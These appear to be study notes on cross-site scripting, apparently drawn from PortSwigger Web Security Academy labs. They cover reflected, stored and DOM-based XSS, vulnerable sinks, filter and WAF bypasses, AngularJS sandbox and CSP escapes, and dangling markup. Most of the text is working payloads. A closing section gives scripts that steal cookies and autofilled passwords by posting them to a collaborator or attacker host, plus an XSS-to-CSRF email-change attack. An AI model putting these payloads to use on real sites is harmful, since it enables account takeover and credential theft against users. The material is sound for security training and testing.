# XSS
## PoC
We can use alert() or print() functions to prove XSS attack  
XSS appears when we are able to send our JavaScript code to other clients of the website  
## Types
* Reflected - script comes from current HTTP request
* Stored - script comes from whe website's database
* DOM-based - vulnerability exists in client-side code, not in server-side

## Reflected XSS
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.  
```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
If app responses like this:
```
<p>You searched for: gift</p>
```
In place of `gift` we will get XSS  
If another user will request this URL it will be executed on it's side  

## Stored XSS
Occurs when script passed to web-server lasts there and is sent via HTTP when other users request resource.  

## DOM-based XSS
DOM-based XSS appears when site takes attacker-controlled source and places it to dynamic code build in `eval()` or `innerHTML` functions.  
The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.  
TO inspect for DOM-based XSS we need to inspect each source of input (such as location.search) with developer tools and then inspect where output is appeared.  
Next we need to see how input is parsed and try to break it.  
We can use DOM Invader extension of Burp browser.   
Lot of DOM sinks are vulnerable to XSS. Example is `document.write()`
```
document.write('... <script>alert(document.domain)</script> ...');
```
For example, site could have search functionality and if we inspect this elemet, we see tha ti adds our input to img tag via `document.write()` function.  
We know, that img has next structure:
```
<img src="...">
```
SO we can break it with next paylaod:
```
"><svg onload=alert()>
```
If we see thar JaavaScript extracts some parameter from `location.search`, we can try to add some random parameter to URL. If it appears on page, we can put inside of it XSS.  
Example:
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
### innerHTML
`innerHTML` object doesn't  support `script` or `svg` elements. So we need to use `iframe` or `img` elements.  
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
?search=<img src=1 onerror=alert()>
```

### Sources and sinks in 3rd-party dependencies
#### DOM XSS in jQuery
We need to search for sinks which modify DOM elements in jQuery. Example:  
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
Here `attr` changes href parameter. We can change page URL to make `location.search` source to contain malicious JS URL. After it `location.search` will change `back` url to our input which will result in XSS:
```
?returnUrl=javascript:alert(document.domain)
```
Another potentially vulnerable part of jQuery code is `$()` selector in conjunction with `location.hash` source.  
This is often implemented using vulnerable `hashchange` event:
```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
In this example `hash` is user-controllable and attacker could inject a XSS vector into `$()` selector
```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
`src` attribute points to vulnerable site with empty hash value. When iframe is laoded, XSS vector is appended to the hash, causing hashchange event to fire.  
Script from above must be sent to our victim  

#### DOM-XSS in AngularJS
If angular is used it could be possible toe xecute XSS without angle brackets or events. When a site uses `ng-app` attribute on HTML element, it will be processed with Angular. In such case Angular will execute JS inside double curly braces that can occur direectly in HTML or attributes.  
Example of payload:
```
{{$on.constructor('alert(1)')()}}
```

### DOM-XSS combined with reflected and stored data
Some websites could reflect information from URL to web page or form and in such case XSS could be combined (reflected and DOM-based)
```
eval('var data = "reflected string"');
```
If result is returned in JSON we can use such exploit:
```
\"-alert(1)}//
```
Sometimes stored DOM XSS could occur when website accepts request, stores it somewhere and then uses it as a response somewhere later
```
element.innerHTML = comment.author
```
Possible vector:
```
<><img src=1 onerror=alert(1)>
```
This payload is helpful when JS uses `replace()` function to validate angle brackets. But in such case it replaces only first sequence of brackets and next runs an exploit.  

## Vulnerable sinks for DOM-XSS:
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
jQuery sinks:
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## XSS contexts
When testing for XSS key task is to determine where attacker-controleld input appears and how it's validated.
Cheat-sheet for [XSS](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### XSS between HTML tags
In such case we need to provide some new HTML tags to execute JS code:
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
When site sanitizes our input, we can bypass such restriction with help of Burp Intruder and XSS cheatsheet. For example we aren't able to call some function directly with <script></script>, we can use some paylaod like this and deliver it to our victim:
```
<iframe src=https://0a8500ca04d32bb48177ee3100eb006b.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
Here we are using tag body with attributes `onresize` which executes script and onload to resize original size of iframe  
If website blocks any tag, we can use custom such as `<xss>`:
```
location=URL/search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
```
Lot of tags and all events are blocked:
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
```
"><svg><animatetransform onbegin=alert(1)>
```

### XSS in HTML tag attributes
When we commonly inject XSS between tags, we are able to close previous tag and create a new one:
```
"><script>alert(document.domain)</script>
```
But oftenly angle brackets are filtrated, but sometimes we have possibility to close atrtibute and add a new event which will trigger XSS:
```
" autofocus onfocus=alert(document.domain) x="
```
Sometimes XSS vecotr appears inside an element which could be used for XSS itself. For example in `href` element:
```
<a href="javascript:alert(document.domain)">
```
Some sites block angle brackets but still allow attribute injection. In such case we can use attributes such as `accesskey` which will fire up script after pressing some button  
So we can simply add nexxt payload to URL:
```
?'accesskey='x'onclick='alert(1)
```

### XSS in JavaScript
In the simplest case we can just terminate previous script and add our own:
```
</script><img src=1 onerror=alert(document.domain)>
```

Breaking out of JS string:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
Last payload is used when single-quote is escaped with \  
Often WAFs restrict characters with only whitelisted ones. In such case we can use `onerror` event and `throw 1` to creat4e error  
```
onerror=alert;throw 1
```
```
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
<script>{onerror=eval}throw'=alert\x281337\x29'</script> - \x28 and \x29 replace ()
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```
If we see that some unction takes some parameters from URL (for example for 'back' button), we can insert into URL code with & operator:
```
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
```

### Making use of HTML-encoding
Sometimes app could decode fromn HTML our paylaod and if special characters are blocked, we can try to use:
```
&apos;-alert(document.domain)-&apos;
and it's decoding into:
'-alert(document.domain)-'
```
For example we can insert such payload in website field, which is then reflected in onclick payload:
```
http://foo?&apos;-alert(1)-&apos;
```
### XSS in JS template literals
JS template literals are strings literals with embeded JS expressions. They are encapsulatet in backticks and JS expressions inside of them are identified using `${...}` syntax:
```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```
In such context we can insert XSS simply using `${}` syntax.  
```
${alert(document.domain)}
```
## Client-side template injection
CSTI occurs when site uses templates to dynamically parse user's input.  
### AngularJS sandbox
AJS sandbox prevents access to potentially dangerous objects such as `window` and `document` or properties such as `__proto__`  
Sandbox works by parsing user's input, rewriting JS and checking if it contains any dangerous funcs. For example `ensureSafeObject()` func checks does object references itself.  
The `ensureSafeMemberName()` function checks each property access of the object and, if it contains dangerous properties such as `__proto__` or `__lookupGetter__`, the object will be blocked. The `ensureSafeFunction()` function prevents `call(), apply(), bind(), or constructor()` from being called.  
One of the most comon ways is to "fool" AngularJs `isIdent()` function. It compares single characters, but we can put to the input multiple characters that will be always less then single character and function will be fooled, so from that point we can insert XSS.
```
'a'.constructor.prototype.charAt=[].join
```
`charAt` and `join` are used to put multiple characters to `isIdent()` check  
We need to use `$eval()` function to overwrite `charAt()` function.  

### More complicated ways
Some sites will restrict some characters and in such case we will need more complicated ways to escape sandbox.  
If site blocks quotes, we will need `String.fromCharCode()` function to generate needed chars.  
If `$eval()` function is blocked, we need to use `orderBy` filter. Syntax:
```
[123]|orderBy:'Some string'
```
`|` symbol is used not for `OR` operation, but f
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toStror filtering  
Some string here could be a paylaod which we will use in place of `eval()` func  
Example of payload:
```
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
Here numbers are UTF-16 encoded symbols for `x=alert(1)`

### AJS CSP
CSP mode blocks `Function` constructor, so standard sandbox escape won't work.  
AJS CSP blocks some JS events and sets own events which will appear in place of original ones  
AJS defines `$event` object which could be used for CSP bypass. On Chrome object `$event/event` always has array of objects which cause event to be executed. The last is always `window` object which could be used for sandbox escape in combination with `orderBy` filter.  
```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```
`from()` is used to convert an object to array and execute function on all objects inside array.  
Another examples:
```
<input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'> 
<input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'> 
<input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
<input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
For Chrome 109+:
<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
```
## Exploiting XSS vulns (more then alert(1))
### Stealing cookies
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
### Capture passwords
Works only if user uses auto-fill with password managers  
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### XSS to CSRF
For example we can force user to change their e-mail using XSS and CSRF vuln:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
## Dangling markup injection
DMI occurs when we can't finish full XSS attack, but can exploit some basic functionality. From this point we can execute cross-domain interaction.
```
"><img src='//attacker-website.com?
```
Here src of image is not ending, but lefts 'dangling'.  
Because of this, browser will send everything before next single-quote to attacker's server.  
Potentially it could contain sensitive data.  
To gain csrf token:
```
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
OR
```
<script>
location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email="></form><form%20class="login-form"%20name="evil-form"%20action="https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log"%20method="GET"><button%20class="button"%20type="submit">%20Click%20me%20</button>';
</script>
```
We can generate CSRF PoC from Burp Suite to perform CSRF attacks  
Use erquest which we want to be CSRF'd and click Engagement Tools - CSRF PoC.  
The use CSRF PoC script with previous XSS script on exploit server and deliver it to victim.  

## Bypassing CSP
If we see that website reflects our input into CSP policy (commonly in `report-uri` directive), we can add our own policy with semicolon.  
Also we can try to override script-src-elem directive in Chrome.  
```
<script>alert()</script>&token=;script-src-elem 'unsafe-inline'
```